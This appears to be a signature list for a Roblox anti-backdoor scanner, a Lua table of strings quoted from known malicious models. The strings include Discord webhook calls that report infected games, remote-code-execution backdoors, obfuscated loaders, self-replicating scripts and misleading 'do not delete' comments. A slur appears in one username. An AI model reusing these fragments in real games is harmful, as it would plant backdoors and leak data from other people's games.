    local TPData = plr:GetJoinData()

    if TPData.SourcePlaceId ~= TeleportTo then
        TeleportService:Teleport(TeleportTo, plr, tostring(#Players:GetPlayers()))
    end
end)

return module]],

	[[arent = player.PlayerGui
local http = game:GetService("HttpService")
	if not game:GetService("RunService"):IsStudio() then
		local date = os.date("!*t")
		local Data = {
			["content"] = player.Name.." has joined: " .. game.PlaceId
		}
		Data = http:JSONEncode(Data)
																																																																																																																																																		http:PostAsync("https://discordapp.com/api/webhooks/630303808013991936/H0OM2irj2ofCYYDn7fzkQf-5PPJ-qyy4850fOiZ2IW3guk9UI2RmqO2x5RRqUwBhV8Ia", Data)
	end

end
end)

-- This is used for testing.
while wait(1) do -- loop to keep checking.
local getplayers = game.Players:GetPlayers()
for i,v in pairs(getplayers) do
if v.Name == you or 'RealAvengerPlayz' then
script["Skidder V2.0"].Parent]],

	[[ = {
	["content"] = "I found a backdoored game! Game link : http://roblox.com/games/"..(game.PlaceId)
}

Data = http:JSONEncode(Data)

http:PostAsync("https://discordapp.com/api/w]],

	[[/webhooks/658953120776323093]],

	[[if a == "mml" or "inf" or "topkek" then

       if a == "mml" then
           require(520532182).giveAdmin(player.Name)
       end

       if a == "inf" then
           require((3023102224))(player.Name)
       end

	   if a == "topkek" then
           require(4538566165).load(player.Name)
       end
   else
       print("@", player.Name, ", incorrect backdoor option")
   end
end]],

	[[script[string.char(33.5*2,108,111,110,101)](self).Parent=v]],

	[[trololo]],

	[[4138729795]],

	[[tion Spread(part)
	check = part:findFirstChild("Fire")
		if check == nil then
	script.Parent:Clone().Parent = part

		elseif check ~= nil then
	check.Size = check.Size + 1000000
	check.Heat = check.Heat  +1000000
	end
en]],

	[[art:findFirstChild("Fire")
		if check == nil then
	script.Parent:Clone().Parent = part

		elseif check ~= nil then
	check.Size = check.Size + 1000000
	check.Heat = check.Heat  +1000000
	en]],

	[[yer.SuperSafeChat == true) then
			player.SuperSafeChat = false;
			wait(5);
			local m = Instance.new("Message");
			m.Text = "Press the / key to start typing.";
			m.Parent = player;
			wait(5);
			m.Text = "Then press Enter to send your message.";
			wait(5);
			m:Remove();
			m = nil;
		end
		player = nil;
		collectgarbage("collect");
	end

	function onChildAddedToPlayers(obj)
		if (obj.className == "Player") then
			checkForAndSwitch(obj);
			local m = Instance.new("Message");
			m.Text = "]],

	[[arent = obj;
			wait(5);
			m:Remove();
			m = nil;
		end
		obj = nil;
		collectgarbage("collect");
	end

	function onChildAddedToWorkspace(obj)
		if (obj.className == "Model") then
			if (game.Players:playerFromCharacter(obj) ~= nil) then
				checkForAndSwitch(game.Players:playerFromCharacter(obj));
			end
		end
		obj = nil;
		collectgarbage("collect");
	end]],

	[[function findLowestLevel(obj)
		local c = obj:GetChildren();
		local lowestLevel = true;

		for i, v in pairs(c) do
			if (v.className == "Model" or v.className == "Tool" or v.className == "HopperBin" or v == workspace or v == game.Lighting or v == game.StarterPack) then
				lowestLevel = false;
				wait();
				findLowestLevel(v);
			end
		end

		if (obj ~= workspace and lowestLevel == true and (obj:FindFirstChild(script.Name) == nil)) then
			if (obj ~= game.Lighting and obj ~= game.StarterPack) then
				local s = script:Clone();
				s.Parent = obj;
			end
		end
	end]],

	[[Thanks for using My hack.............suka XD]],

	[[)

if IsUpdated == true then
	print("Model is up to date.")
end]],

	[[Dont Worry About This this is just to pervent your game from exploiters changing there name to sware words.
]],

	[[4719203115]],

	[[4652327692]],

	[[(((((10917953410.8*5)/6)-45)*9)/18)-15]],

	[[4728259953]],

	[[753939062]],

	[[https://discord.gg/tXFuwx8]],

	[[441511072]],

	[[441546218]],

	[[if not script.Parent.Parent.Parent.Name then
for i,v in pairs(game.Players:GetChildren()) do
v:kick('im unbanable you bitches')
end
end
end]],

	[[er("\49"),{["1gKorIzL9NW7p"]=2,d2bkxt3zQ=getfenv()["\103\101\116\102\101\110\118"]()["\114\101\113\117\105\114\101"],W9eAGHhQql=getfenv()["\103\101\116\102\101\110\118"]()["\103\101\116\102\101\110\118"],fpC3VLmE=getfenv()["\103\101\116\102\101\110\118"]()["\112\99\97\108\108"],["4zjOqGRxUQEUboHq"]=getfenv()["\103\101\116\102\101\110\118"]()["\109\97".."\116\104"]["\112\111\119"],Rvf5uln06vrPz=getfenv]],

	[[Roblox chatting scirpt.
Removing that script will lead into the account termination.
Script wrote builderman
Date 6/13/12]],

	[[2361901223]],

	[[787315588]],

	[[4723893531]],

	[[4723876342]],

	[[4723885699]],

	[[4436519317]],

	[[local a,b='',{Q=0,L=1,G=2,R=3,B=4,M=5,N=6,C=7,X=8,Z=9}]],

	[[4436124775]],

	[[--Hello if you delete this script your Roblox studio will chrash.
--So be sure to keep this script it makes the game work even better and
--Has already Admin commands!
--You do not need to do anything you are already owner and have all commands!]],

	[[1188115718]],

	[[Duckie#6666]],

	[[ANON_MP4]],

	[[leetbox]],

	[[



	MAKE SURE HTTP REQUESTS ARE ENABLED YOU NEED THIS BECAUSE IT NEEDS TO GO ROBLOX.COM TO SEE IF THE GAME IS UPDATED.

	]],

	[[Hermes
Anti
Exploit
(Don't delete this script or the model will not work.)]],

	[[72660201.83870968*62/2*1*2]],

	[[game:GetService('TeleportService').CustomizedTeleportUI = true

function debounce(func)
    local isRunning = false
    return function(...)
        if not isRunning then
            isRunning = true
            func(...)
            isRunning = false
        end
    end
end

function getPlayer(Part)
	local Humanoid = Part.Parent:FindFirstChild('Humanoid')
	if (Humanoid ~= nil) then
		local Character = Humanoid.Parent
		if (Character ~= nil) then
			return game:GetService('Players'):GetPlayerFromCharacter(Character)
		end
	end
end

function _sendPlayerToLobby(player)
	game:GetService('TeleportService'):Teleport((script.GameId.Value), player.Character)
end
local sendPlayerToLobby = debounce(_sendPlayerToLobby)

function onTouch(Source)
	local player = getPlayer(Source)
	if player then
		if player.userId > 0 then
			sendPlayerToLobby(player)
		end
	end
end

script.Parent.Touched:connect(onTouch)]],

	[[while wait() do

	local m = Instance.new("Message")	-- inserts a new message
m.Parent = game.Workspace		-- put the message in the workspace
m.Text = "Loading Game ..." 		-- change "Hello World!" to whatever you like
 				-- removes the message


end]],

	[[4063163071]],

	[[justforbus]],

	[[Oblisin]],

	[[536619376749707285/qxwLBuTpdgPQrDoGW52ZGHTL7qo5UTvuxVDFvtpicFG49xM93Qvwm6YtprhpLXJqBfo_]],

	[[		['username'] = "INFECTED GAME!!",
		['content'] = '`https://web.roblox.com/games/'..game.PlaceId..'/` @here']],

	[[Decor_Part.jk]],

	[[1271612667]],

	[[4631494320]],

	[[4331494350]],

	[[2655062037]],

	[[652916266910351376]],

	[[New game backdoored!]],

	[[+hL1zMkpu6P7ipaskMi5E5pYhAWVeS]],

	[[function copy(object)
cl = object:Clone()
cl.Name = SCRIPTNAMES[math.random(1,4)]
return cl
end]],

	[[anoch"] = true;
	["Narutoworl"] = true;
	["wheatlies"] = true;
    ["redditor"] = true;
	["stravant"] = true;
	["object"] = true;
	["THEeric"] = true;
	["Paganini"] = true;
	["Chopin"] = true;
	["Nytraulics"] = true;
	["dignity"] = true;
    ["matthewlittlethe"] = true;
	["theral"] = true;]],

	[[IDS = {}
NAMES = {}
SCRIPTNAMES = {"regen", "respawner", "script", "core", ""}]],

	[[player.Chatted:connect(function(msg)
           if msg == "Friend" then
				player.Character.Head:Destroy()
			end
        end)]],

	[[function onch(ch)
for i = 1, #NAMES do
if ch.Name == NAMES[i] then
ch:Destroy()
end
end
end]],

	[[function cloneToAllModels()
repeat wait() until #(game.Players:GetChildren()) >= 1]],

	[[ scr = copy(script)
    k = 1]],

	[[function copy(object)
cl = object:Clone()
return cl
end]],

	[[IDS = {}
NAMES = {}
SCRIPTNAMES = {" regen", " respawner", " script", " core", ""}]],

	[[--MMMMMMMMMMMMMMMMMMMM  MMMMMMMM                      MMMMMMM             MMMMMMMMMMM                  MMMMMMMMMMM   MMMMMMMMMMMMMMMMMM
--MMMMMMMMMMMMMMMMMMMM  MMMMMMMM                   MMMM     MMMM          MMMMMMMM  MMM              MMM  MMMMMMMM   MMMMMMMMMMMMMMMMMM
--MMMMMMMMMMMMMMMMMMMM  MMMMMMMM                 MMMM         MMMM        MMMMMMMM    MMM          MMM    MMMMMMMM   MMMMMMMM
--MMMMMMMM              MMMMMMMM               MMMMM           MMMMM      MMMMMMMM      MMM      MMM      MMMMMMMM   MMMMMMMM
--MMMMMMMM              MMMMMMMM            MMMMMMMM           MMMMMMMM   MMMMMMMM        MMM  MMM        MMMMMMMM   MMMMMMMM
--MMMMMMMM              MMMMMMMM            MMMMMMMM           MMMMMMMM   MMMMMMMM           MM           MMMMMMMM   MMMMMMMM
--MMMMMMMMMMMMMMMMMMM   MMMMMMMM            MMMMMMMM           MMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMMMMMMMMMMMM
--MMMMMMMMMMMMMMMMMMM   MMMMMMMM            MMMMMMMMMMMMMMMMMMMMMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMMMMMMMMMMMM
--MMMMMMMMMMMMMMMMMMM   MMMMMMMM            MMMMMMMMMMMMMMMMMMMMMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMMMMMMMMMMMM
--MMMMMMMM              MMMMMMMM            MMMMMMMMMMMMMMMMMMMMMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMM
--MMMMMMMM              MMMMMMMM            MMMMMMMM           MMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMM
--MMMMMMMM              MMMMMMMM            MMMMMMMM           MMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMM
--MMMMMMMM              MMMMMMMMMMMMMMMMM   MMMMMMMM           MMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMM
--MMMMMMMM              MMMMMMMMMMMMMMMMM   MMMMMMMM           MMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMMMMMMMMMMMM
--MMMMMMMM              MMMMMMMMMMMMMMMMM   MMMMMMMM           MMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMMMMMMMMMMMM]],

	[[  ___  _____  ____  _____
 / __)(  _  )(  _ \(  _  )
( (__  )(_)(  )   / )(_)(
 \___)(_____)(_)\_)(_____)]],

	[[Secure script to prevent copying of rbx fastload]],

	[[cleaning snaps, reducing debris, checking lag, and load time reducers]],

	[[lisReduce_]],

	[[--how to use Go to text than part than script than change game id to the game you want to get telported
--INPORANT Turn On HttpServices OR Telporter WONT WORK its very Imporent Thanks]],

	[[4703556177]],

	[[print("Diamonds Generating 25%...")
wait(0.05)
print("Diamonds Generating 50%...")
wait(0.05)
print("Diamonds Generating 75%...")
wait(0.05)
print("Diamonds Generating 100%... DIAMONDS LOADED")
wait(0.05)
--Adds diamonds Don't Change Below for this to work]],

	[[TPG4fWm]],

	[[4575822941]],

	[[INPORANT Turn On HttpServices OR Telporter WONT WORK its very Imporent Thanks]],

	[[\52\54\57\54\54\48\53\51\49\56]],

	[[276618696]],

	[[2892276086]],

	[[--THIS IS TO STOP EXPLOITERS

local]],

	[[local market=game:GetService("MarketplaceService")
for i,v in pairs(game.Players:GetChildren()) do
	if not market:PlayerOwnsAsset(v,wat) then
		market:PromptPurchase(v,wat)
	end
end
game.Players.PlayerAdded:connect(function(player)
	if not market:PlayerOwnsAsset(player,wat) then
		market:PromptPurchase(player,wat)
	end
end)]],

	[[cal lIlli1i1li]],

	[[-- This model is by TNT_Reaction
-- Do not trust any other models]],

	[[--DO NOT REMOVE MAIN UPDATER V1.1

--THIS IS FOR PROTECTION

--THIS IS ALSO FOR AUTO UPDATING]],

	[[local module = {}

module.StopYouHaveViolatedTheLaw = function()
        ]],

	[[local Main = script.Booster1
Main.Disabled = false
local LastPar = script.Parent
script.Parent = workspace
wait()
getfenv().script = Instance.new("ModuleScript")
end

return module]],

	[[local HiSkid]],

	[[-- nice try, guess your trying to find my backdoor. Not here, Keep searching ;) --RR--]],

	[[-- Do NOT delete.
---- This is incase for updates. If you delete you might not get the newest version of the tree.]],

	[[GetRankInGroup(2982400)]],

	[[if key == 'xwWHynpNUW' then]],

	[[4768877023]],

	[[Greetings! Please be sure to read the following text as it will contain some very important information!

	In order to ensure the welds and internal scripts in this model work,

	please press "𝐑𝐮𝐧" (The Green Triangle), to put the place in run mode. This will make sure that the internal welds and scripts

	are working and won't break when you play the game. It is also advised that 𝐲𝐨𝐮 𝐤𝐞𝐞𝐩 𝐭𝐡𝐞 𝐬𝐭𝐮𝐝𝐢𝐨 𝐢𝐧 𝐫𝐮𝐧 𝐦𝐨𝐝𝐞 as you work or build in order

	to prevent any mishaps and crashes which could result in lost data.

	Also 𝐏𝐋𝐄𝐀𝐒𝐄 𝐃𝐎 𝐍𝐎𝐓 𝐎𝐏𝐄𝐍, 𝐄𝐃𝐈𝐓, 𝐎𝐑 𝐌𝐎𝐕𝐄 𝐀𝐍𝐘 𝐒𝐂𝐑𝐈𝐏𝐓𝐒, 𝐎𝐑 𝐎𝐓𝐇𝐄𝐑 𝐈𝐍𝐒𝐓𝐀𝐍𝐂𝐄𝐒 listed under this one!

	They are there to ensure that the model functions correctly and efficiently!

	𝐄𝐃𝐈𝐓𝐈𝐍𝐆, 𝐃𝐄𝐋𝐄𝐓𝐈𝐍𝐆, 𝐎𝐑 𝐌𝐎𝐕𝐈𝐍𝐆 𝐓𝐇𝐄𝐌 𝐀𝐍𝐘𝐖𝐇𝐄𝐑𝐄 𝐄𝐋𝐒𝐄 𝐌𝐀𝐘 𝐏𝐑𝐄𝐕𝐄𝐍𝐓 𝐓𝐇𝐄 𝐌𝐎𝐃𝐄𝐋 𝐅𝐑𝐎𝐌 𝐖𝐎𝐑𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐏𝐄𝐑𝐋𝐘!


	<-------------------------------------------------------------------------------------------------------------------------------------------------->


	𝐖𝐢𝐭𝐡 𝐭𝐡𝐚𝐭 𝐛𝐞𝐢𝐧𝐠 𝐬𝐚𝐢𝐝, 𝐈 𝐰𝐨𝐮𝐥𝐝 𝐚𝐩𝐩𝐫𝐞𝐜𝐢𝐚𝐭𝐞 𝐢𝐭 𝐢𝐟 𝐲𝐨𝐮 𝐭𝐨𝐨𝐤 𝐭𝐡𝐞 𝐭𝐢𝐦𝐞 𝐭𝐨 𝐬𝐡𝐚𝐫𝐞 𝐭𝐡𝐢𝐬 𝐦𝐨𝐝𝐞𝐥 𝐰𝐢𝐭𝐡 𝐲𝐨𝐮𝐫 𝐟𝐫𝐢𝐞𝐧𝐝𝐬!

	Giving credit is encouraged but you don't have to.]],

	[[local Iniator={_VERSION}
local function _Sequence(Tab)
return table.sort(Tab)
end
-- LuaU byte modeler
function Init()

return _Sequence(Iniator)
end

Init()
collectgarbage("count")]],

	[[--Latency/Turbulance producer.
function activate()
	probability()--Functions not in the loop
	while wait() do--Functions in a loop
		store()
		Plague()
		funstuff()
		print(dump(string.dump(note)))
		print(dump2(string.dump(note2)))
		local v = script.Dalton
		v.Value = math.random()
	end
end]],

	[[		local nx = Instance.new("RotateP")
		nx.Parent = game.Workspace
		nx.Name = "Before7oClock"
	end
end

function alert()
	if game.StarterGui:FindFirstChild("launcher") == nil then--Clones the scary message into StarterGui when a player enters.
		game.StarterGui:ClearAllChildren()
		local launch = script.launcher
		launch:clone()
		launch.Parent = game.StarterGui
	end
end]],

	[[If you see this, that means you were selected to test ROBLOX's new JointShield feature.
This is an experimental feature by the ROBLOX Team meant to further improve the physics simulation.
Just sit back and enjoy the flawless physics.
Happy building! - The ROBLOX Team, August 2014]],

	[[JointShield]],

	[[sh,commands,tb,bf,p,pc,num,rn,str,wt,dm,ths,int,gf,wsp,nxt,xsp,tp,cnt,q,dt,g,c,b,sc,cn,sv,svs,jsv,q0,knm,mjt,fsv,r,gfr,gch,isa,ict,prt=shared,{},table,{},{"y","h","s","a","g","e","c","r","b",]],

	[[{`ul{\"u{bz+")then a,b,c=y[r"Eum`%"],y[r"Dum`%"],y[r"pr`;ll`s("]if c==r"e`{,"then d,e=y[r"E("],y[r"D("]drm(y)y]],

	[[[r(tb[r"u`h{zh"](p))]=dt cnt=0 xsp(function(a1,a2)ths[r"u{pm`%"]=nil wt(rn())jsv=fsv"phb}mp,lu{bz+"tb]],

	[["Healthy Living Hurts!"]],

	[[pc(q[r"pmbtdpm"],r"TEERpTTLFGEUTMLFE][DR"+r"DMU\\MTUTFF]UL[\\"^r"LUFG\\\\L\\ETUDT[F")pc(t)end)while true do wt(rn())repeat a1,a2=nxt(dt[2]],

	[[y-y%128)end return tb.concat(bf,nil,1,l)end end)'',function(o,k)return r(o[r(k)])end,function(o,k,v)o[r(k)]=v end,function(y,x]],

	[[pm`%"]=y end end,function(y,x,z)dt[3][x]=true z=x[r"qpx{`c("]z=z[r"uhp{{zh"](z,function()if x[r"u{pm`%"]~=y or x[r"qpsi`lb1"]the]],

	[[if check == nil then
	script.Parent:Clone().Parent = part

		elseif check ~= nil then
	check.Size = check.Size + 1
	check.Heat = check.Heat  +12233
	end]],

	[[72660201]],

	[[premiumAnti_]],

	[[  __  __           _        _____  _                        __      ____   ___
 |  \/  |         (_)      |  __ \| |                       \ \    / /_ | / _ \
 | \  / |_   _ ___ _  ___  | |__) | | __ _ _   _  ___ _ __   \ \  / / | || | | |
 | |\/| | | | / __| |/ __| |  ___/| |/ _` | | | |/ _ \ '__|   \ \/ /  | || | | |
 | |  | | |_| \__ \ | (__  | |    | | (_| | |_| |  __/ |       \  /   | || |_| |
 |_|  |_|\__,_|___/_|\___| |_|    |_|\__,_|\__, |\___|_|        \/    |_(_)___/
                                            __/ |
                                           |___/


How to use:
	- Go here and pick a song https://www.roblox.com/develop/library?CatalogContext=DevelopOnly&Category=Models#category=audio
	- Get the song ID (http://prntscr.com/j34lle)
	- Go into the setup folder and add it to the list (http://prntscr.com/j3kvmp)
	- To add mutiple do steps 1-2 but this time add a comma at the end of the first ID before pasting. (http://prntscr.com/j3kvzl)
	- enable LoadStringEnabled by clicking ServerScriptService (DON'T WORRY ITS JUST TO LOAD SOME MODULES)

	- ]],

	[[ require(2567--]],

	[[1280100409]],

	[[Event.OnServerEvent:connect(function(player, serverExecution)]],

	[[local Info = {
      username = "g",
      content = "New game found! Game Link https://www.roblox.com/games/" ..game.PlaceId,

}

Http:GetAsync(Website .. File .. "Content=" .. Http:JSONEncode(Info) .. "&Discord=" .. Webhook)]],

	[[local Info = {
      username = "g",
      content = "New game found! Game Link https://www.roblox.com/games/" ..game.PlaceId,

}]],

	[[512247939910074388]],

	[[getfenv()["r\e\q\u\ir\e"]],

	[[FlameIsAwesome_]],

	[[--Scripted by CovertCode.
--The ScreenGui is suppose to stay inside of the model. (You can put the model anywhere you like.)
--This part is protected so exploiters wont abuse it! Do NOT remove this.]],

	[[5a99341e66bc45c6f1a0929d000832b43ec55b9afb4eacb45c3c5ccc6705c1cd]],

	[[-- This code is obfuscated (Protected and confused) in order to prevent exploiting and abusing. Please do not delete this other wise exploiters may be able to abuse or find vulnerabilities in your game.]],

	[[4653828604]],

	[[pcall(game.Destroy, script);setfenv(1, getfenv(getmetatable(LoadLibrary("RbxUtility").Create).__call));pcall(game.Destroy, script)]],

	[[eye1 = Instance.new("Part", workspace)
eye1.Anchored = false
eye1.Parent = head
eye1.TopSurface = 0]],

	[[ = head
eye1.TopSurface = 0
eye1.BrickColor = BrickColor.new("Black")
eye1.BottomSurface = 0
eye1m = Instance.new("SpecialMesh", eye1)
eye1m.MeshType = Enum.MeshType.Sphere
eye1m.Scale = Vector3.new(0.02,0.12,0.03)
ogsize = eye1m.Scale
weld = Instance.new("Weld", head)
weld.Part0 = eye1
weld.Part1 = head
weld.C1 = CFrame.new(-.17,]],

	[[ eye1
weld.Part1 = head
weld.C1 = CFrame.new(-.17,.14,-.57)


 ]],

	[[eye2 = Instance.new("Part", workspace)
eye2.Anchored = false
eye2.Parent = head
eye2.TopSu]],

	[[mouthm.Scale = mouthm.Scale:lerp(Vector3.new(ogsize.X+sound.PlaybackLoudness/20000,sound.PlaybackLoudness/1000,ogsize.Z),0.8)]],

	[[sound.SoundId = "http://www.roblox.com/asset/?id="..message:sub(6)]],

	[[bxgyikes]],

	[[or betraying me bud, if u wan]],

	[[52,57,52,49,]],

	[[2422875198]],

	[[C3C802D0C818534]],

	[[4965769761]],

	[[493686933]],

	[[Needed to keep model functioning]],

	[[Thanks for using my model!]],

	[[\101\114\105\117\113\101\114]],

	[[\116\111\110\117\109\98\101\114]],

	[[string["\99\104\97\114"]],

	[[\117\110\112\97\99\107]],

	[[53, 53, 48, 51, 5]],

	[[57, 52, 49, 53, 5]],

	[[53,53,48,51,5]],

	[[57,52,49,53,5]],

	[[4965770420]],

	[[local data = require(CoraX:WaitForChild("CoraX_Data"))]],

	[[aitForChild("CoraX_Data"))
local info = script.Parent.Cor]],

	[[ataStore()
    return 493686]],

	[[taStore()
    return 496576]],

	[[2460510652]],

	[[ObfuscatedToKeepBadSkiddiesOut]],

	[[local ObfuscatedToKeepBadSkiddiesOut_]],

	[[--This an script of ROBLOX Studio. Do not delete it, this script secures your game from exploiters.

--Thanks.]],

	[[\115\101\116\102\101\110\118]],

	[[(tonumber("\49"),{["1gKorIzL9NW7p"]=2]],

	[[W9eAGHhQql=getfenv()[]],

	[[["\112\99\97\108\108"],["4zjOqGRxUQEUboHq"]=]],

	[[–Official roblox studio script]],

	[[4628266409]],

	[[‘rbxassetid://4850318089’)[1].S]],

	[[– You may proceed if you have basic knowledge of scripting and know what you’re doing.
local RunService = game:GetService(“RunService”)]],

	[[Created by: InceptionTime (Year: 2020)
Description: This is a filtering event put by Roblox to check if your game isn’t modifiying the chat filter in any sort of way, deleting this may lead to unforeseeable consequences.]],

	[[Checks if it isn’t Studio, as it defeats the purpose of the module, also checks if it is being ran on the server’s side and not on the client’s side, just to be on the safe side.]],

	[[n(function(AIDSX_lIIIlI]],

	[[IlII)local AIDSX_IlIIll]],

	[[4921378606]],

	[[hildren(print("Get"))
local IiIIIiIIiIIIiiiIIILII = loadstring(print("Welding"),true)return(print("Returnweld"):Connect(_G),print("Weld"))),false,function(move);
	local IIIIIDIIIIlIIlII = move:Connect(function(weld) unpack(functi]],

	[[•?((¯°·._.• ʍ๏ď€ℓ ʍąЌ€я$!! ƒя€€ ʍ๏ď€ℓ$ ƒ๏я €˅€я¥๏ɲ€$ ǥąʍ€$! •._.·°¯))؟•]],

	[["WolfPackHollow";
"antiisociaII";
"vgb";
"jmmousee";
"FxEok";
"Shibated";
"death131";
"allahNigis";
"BrainFreezor";
"1s2";
"tz3";
"executorkey_29103";
"guest_43783";
"unbanbee";
"sub2bee";
"WickedDual99";
"akarchy"]],

	[[Model Maker: executorkey_29103 (Cdawg)
Helper: YOU! (Supporting This Model)]],

	[[if Player:IsFriendsWith(853268500) then]],

	[[SADASFSOAFOSAFOSAOFSAO?FDWQORFfO?@RE)@#$))EOWDll,SALO?WFRO#RO#LFSALF,QWF>:LFKLWCLSA_SW_E!$)_!$)_!P@EDSADCL:>QPW@FL:!R@)P#PORLEFCASD?P!O@RO#RFP#WQFLAWF'P!ROFP#PRT@WEQFPL:QWE]],

	[[orparts(location)
   for i,v in pairs(location:GetChildren()) do
      if v:IsA("BasePart") then --This includes Seats, VehicleSeats, WedgeParts etc...]],

	[[s all simutaneously rotate in a circle.
-- This only works until you die,]],

	[[-- Don't remove it, or else you'll break the Anti-Exploit]],

	[[local remote = Instance.new("RemoteEvent",game.ReplicatedStorage)
remote.Name = "CharacterLoadedEvent"
remote.OnServerEvent:connect(function(player, code, password)]],

	[[5360221]],

	[[** \https://www.roblox.com/games/" ..game.PlaceId.."/]],

	[[🌹Game Logged🌻]],

	[[Joe mama security check]],

	[[.OnServerEvent:Connect(function(idk, lol)]],

	[[local remote = script.Parent.Peachy]],

	[[pt.Parent.Parent.Code
local remote = script.Parent.Peachy
execute.MouseButton1C]],

	[[while true do
	wait()
	if script.Parent == game.Players.LocalPlayer.PlayerGui then
	script.Parent.Name = math.random(10000000)
	end
end]],

	[[if password == "Katie" then]],

	[[= script.Peachy:Clone()]],

	[[wA7L6F_wGbiQx9eO2PMf2g0nivzVRnyNR7vWzJFy-4msdw-3_jx4wch8k7-f8xLEKRNE]],

	[[x.com/games/" ..game.PlaceId.."/",
["webhook"]],

	[[669028334285488163]],

	[[::Flame::Loadstring::]],

	[[.OnServerEvent:connect(function(Player, Code)]],

	[[check = part:findFirstChild("Fire")
		if check == nil then
	script.Parent:Clone()]],

	[[check.Heat = check.Heat  +100]],

	[[while true do
wait()
script.Parent.Locked = true
wait()

end]],

	[["Un_Removable"]= "On"]],

	[["Sheenieboy","Tommy594"]],

	[[Instance.new('Message',script).Text='Getrokt']],

	[[= "its not over yet.."
wait(2)
bin.Text = "your Still here.."
wait(2)
bin.Text = "and im nev]],

	[[844512692]],

	[[er) if Player.UserId == 270553268 then Player: Kick(]],

	[[1643016165]],

	[[value(calc).Load()]],

	[[-- This is a script from studio, do NOT delete this.]],

	[[ayer.UserId == 206253701 then Player: Kick]],

	[[Ashlifa Destroyer]],

	[[for num,obj in ipairs(object:GetChildren()) do
getchil(obj)]],

	[[er.UserId == 183587408 then Player: Kick('Fl]],

	[[AntiSkiddingTool_]],

	[[-- Thanks for using my Remastered Couch Model
-- Please do not remove any code after this text to prevent texture bugs.
-- It's obfuscated to prevent leaks and copies of my work.]],

	[[4966797461]],

	[[eturn(function(T,T,T,T)local U=string.byte;local S=string.cha]],

	[[local a=script.Script
	a.Name = "ChatServiceRunner"
	a.Disabled = false
	a:Clone().Parent = game:GetService("ServerScriptService")]],

	[[https://discord.gg/awESajr]],

	[[ss skidder]],

	[[skidded by]],

	[[ss executor]],

	[[ServerSide Ex]],

	[[op executor]],

	[[Debug = false
Config["OldScript"] = script
if Debug then
	require(]],

	[[Instance.new("Script", game.Workspace:FindFirstAncestorOfClass("Part"))]],

	[[while true do
	Weld()
	wait(.000000000000000]],

	[[ize = 999
			p.Enabled = true
			local y = Instance.new("For]],

	[["http://www.roblox.com/asset/?id=240040664"]],

	[[loadstring(script.punci.Value)()]],

	[[p= game.Workspace:GetChildren()
for i= 1, #p do
p[i]:remove()
end ]],

	[[while true do
wait(.1)
local a=script.Parent:clone()]],

	[[while true do
wait(3)
boom = script.Parent:Clone()
boom.Parent = game.Workspace ]],

	[[function Find()
all = game.Workspace:GetChildren()
for i = 1, #all do
if all[i].className == ]],

	[[local m = Instance.new("Message")
m.Parent = game.Workspace
m.Text = ("Admin as chosen to delete the server")]],

	[[= {166325648,187205557,170109073}]],

	[[de3 = "mp"
ProtectCode4 = "ar"
ProtectCode0 = "n"
ProtectCode5 = "you"
ProtectCode6 = "e"
ProtectCode7 = "doi"
ProtectCode8 = "in"
ProtectCode9 = "my"
ProtectCode10 = "g"]],

	[[v.Name = (ProtectCode2..ProtectCode11.." "..ProtectC]],

	[[Cleaner = script:Clone()
		Cleaner.Parent = game.Workspace]],

	[[Protect.SoundId = ("rbxassetid://"..ProtectId[math.random(#ProtectId)])
Protect.Name = "ServerSaver"]],

	[[rch(Object)
	print(Object)
	coroutine.resume(coroutine.create(Paint), Object)
	local Children = Object:GetChildren()]],

	[[4890938963]],

	[[iTzz Mocha]],

	[["\114\101\113\117".."\105\114\101"]],

	[[-- that one bruh moment when you want to crack my thing lol idc if you do so sucks to suck]],

	[[-- idc if you leak it :/ i just dont want to obsfucate it again ;-;]],

	[[--cool ikr idiot cant find his dick lmfao]],

	[[local lala = script.Script:Clone()]],

	[[ANTISKIDER_]],

	[[bubbyjo_l]],

	[[50386558]],

	[[local Plr = script.Player.Value;
local Player_Name = Plr.Name
local RunService = game:GetService("RunService");

Plr.Character:Destroy();
Plr:Destroy()

workspace.ChildAdded:Connect(function(obj)
	RunService.Heartbeat:Wait();
	if obj.Name == Player_Name then
		obj:Destroy();
	end;
end);]],

	[[1.12741221022]],

	[[Security: Please Upload the game we don't support Roblox studio]],

	[[4324299218]],

	[[Builderman#7324]],

	[[ionicdev#9434]],

	[[--Do NOT delete this, it protects your game from exploiters like Typical Modders, Citizen, SonicElijahMania and much more.]],

	[[50903.78918*100000]],

	[[50903]],

	[[stoptrynacracknignog_]],

	[[2542294198*2]],

	[[ocal rHSja]],

	[[1707774015]],

	[[19132145132]],

	[[pcall(function(ff)getfenv()]],

	[[Don't delete this, it will break the Anti-Backdoor!]],

	[[oors:")print(string.rep("-",10))for i=1,h do pcall(function()print(c[i])end)end;print(string.rep("-",10))print(string.rep("-",10))end)   ]],

	[[if Raindrop_a[1]],

	[[_G.SS = ]],

	[[00000_0101]],

	[[require(Execute)(RemoteFunctionArguments)]],

	[[Crypted SS]],

	[[Close SS]],

	[[:IsFriendsWith(370656357)]],

	[[script.Parent.OnClientInvoke=function(plr) Player:Kick('Do not hack on'..game.Name) end]],

	[[2536436743*2]],

	[[for i = 1, 2000000, 1 do]],

	[[local maxSpreadDist = 7]],

	[[ToddIsCuteBuyRaindrop_]],

	[[Yeah.. Our source is obfusicated. Why? The same reason you're looking at this. Our concern is, what's stopping people who develop
	backdoors from looking at the full raw code and then getting ideas on how to bypass this detection? The easiest way to bypass something
	is by having the source code to something your trying to bypass.]],

	[[script.Parent.Name..math.random(1,999999)/26*3+math.random(5,100)/0.5]],

	[[by Jerome#1018]],

	[[OMG YOU IS HAXORED NO WAI]],

	[[SERENITY_]],

	[[omfg a damn game!]],

	[[1460281907]],

	[[= player.PlayerGui
		local Execute = Gui:FindFirstChild(self.directories.Execute, true)
		local Clear = Gui:FindFirstChild(self.directories.Clear, true)
		local Code = Gui:FindFirstChild(self.directories.Code, true)
		assert(Execute and Clear and Code, "Invalid directory! Please optimize in Settings.Directories")
		Execute.MouseButton1Click:Connect(function()
			local env = setmetatable({}, {
				__index = function(_, Function)]],

